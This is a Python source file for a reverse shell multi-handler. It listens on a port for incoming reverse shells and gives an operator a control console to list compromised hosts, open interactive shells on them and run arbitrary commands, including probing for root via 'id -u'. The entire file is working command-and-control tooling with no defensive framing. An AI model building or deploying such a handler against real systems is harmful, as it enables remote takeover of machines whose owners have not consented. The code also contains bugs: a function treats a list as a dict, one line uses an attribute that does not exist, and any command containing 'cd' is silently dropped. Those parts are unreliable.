import argparse
import socket
from multiprocessing import Process, Manager

import datetime

parser = argparse.ArgumentParser(description="Reverse shell multi-handler")
parser.add_argument('--control-port', type=int, default=5555, help="TCP port to use for the "
                                                                   "multi-handler client "
                                                                   "connections")
parser.add_argument('--shell-port', type=int, default=4444, help="TCP port to use for reverse shells")

args = parser.parse_args()

manager = Manager()
sessions = manager.list()
conns = manager.list()
server_started = datetime.datetime.now()
PROMPT = '=> '


def total_sessions() -> int:
    s = 0
    for host in sessions:
        s += len(sessions[host])
    return s


class Connection(Process):
    def __init__(self, conn: socket.socket, addr: str):
        self.conn = conn
        self.addr = addr
        super().__init__()

    def run(self):
        welcome = "Server started at {}. {} session{} active.\n".format(
            server_started,
            len(sessions),
            "s" if not len(sessions) == 1 else "")
        self.conn.send(welcome.encode())
        welcome = "Type (l) to list sessions, and (i) to interact with a session.\n"
        self.conn.send(welcome.encode())
        while True:
            try:
                self.conn.send(PROMPT.encode())
            except BrokenPipeError:
                break
            r = self.conn.recv(1024).decode().strip()
            if r == 'l':
                session_list = "Active sessions:\n"
                for n, session in enumerate(sessions):
                    session_list += "({}) {}\n".format(n, session[0][0])
                self.conn.send(session_list.encode())
            elif r.startswith('i'):
                try:
                    index = int(r.split()[1])
                    addr, conn = sessions[index]
                except IndexError:
                    self.conn.send(b"Specify a valid session ID.\n")
                else:
                    self.conn.send("Entering interactive shell on {}. Ctrl+D to quit.\n".format(addr[0]).encode())
                    conn.send(b"id -u\n")
                    try:
                        uid = int(conn.recv(100).decode())
                    except BrokenPipeError:
                        del sessions[index]
                        continue
                    except ValueError:
                        uid = 1000
                    if not uid:
                        prompt = b'# '
                    else:
                        prompt = b'$ '
                    while True:
                        try:
                            self.conn.send(prompt)
                        except BrokenPipeError:
                            break
                        cmd = self.conn.recv(1024)
                        if cmd == b'\n' or b'cd' in cmd:
                            continue
                        if cmd == b'exit\n' or cmd == b'quit\n':
                            self.conn.send(b"Leaving...\n")
                            break
                        conn.send(cmd)
                        self.conn.send(conn.recv(1024))
            elif r.startswith('d'):
                try:
                    index = int(r.split()[1])
                    sessions[index][1].close()
                    del sessions[index]
                except (IndexError, ValueError):
                    self.conn.send(b"Couldn't delete that\n")


class StoppableServer(Process):
    def __init__(self, host: str, port: int):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((host, port))
        self.sock.listen(10)
        self._stop = False
        super().__init__()

    def stop(self) -> None:
        self._stop = True

    def stopped(self) -> bool:
        return self._stop


class ShellServer(StoppableServer):
    def __init__(self, host: str = "0.0.0.0", port: int = 4444):
        super().__init__(host, port)

    def run(self) -> None:
        print("Listening for shell connections")
        while not self.stopped():
            conn, addr = self.sock.accept()
            print("New shell from", addr[0])
            sessions.append((addr, conn))
            for con in conns:
                con.queue.put(addr[0])
        self.sock.close()


class ControlServer(StoppableServer):
    def __init__(self, host: str = '127.0.0.1', port: int = 5555):
        self.conns = []
        super().__init__(host, port)

    def serve(self) -> None:
        print("Listening for control connections...")
        while not self.stopped():
            c = Connection(*self.sock.accept())
            self.conns.append(c)
            c.start()
        self.sock.close()


if __name__ == '__main__':
    ss = ShellServer(port=args.shell_port)
    cs = ControlServer(port=args.control_port)
    try:
        ss.start()
        cs.serve()
    except (KeyboardInterrupt, Exception) as e:
        ss.stop()
        cs.stop()
        raise e
